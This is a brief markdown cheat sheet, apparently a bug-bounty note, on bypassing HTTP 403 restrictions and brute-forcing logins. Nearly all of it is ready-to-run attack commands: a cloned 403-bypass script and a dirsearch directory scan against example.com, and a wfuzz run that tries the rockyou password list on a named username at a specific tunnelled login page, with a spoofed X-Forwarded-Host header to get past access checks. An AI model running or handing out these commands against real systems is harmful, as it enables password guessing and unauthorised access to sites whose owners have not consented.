# Bypass and brute force

## bypass 403

![alt text](/img/image.png)

### bypass tools

```bash
git clone https://github.com/iamj0ker/bypass-403
cd bypass-403
./bypass-403.sh www.example.com/
```

or

```bash
dirsearch -u "www.example.com/" -w wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### bypass login

```bash
wfuzz -c -z file,bughunter/tools/wordlists/rockyou.txt --hh 810 -d "username=khuluq&password=FUZZ" -H "X-Forwarded-Host: 127.0.0.1" https://withered-moon-01412.pktriot.net/index.php
```

![alt text](/img/proof1.png)
![alt text](/img/image1.png)
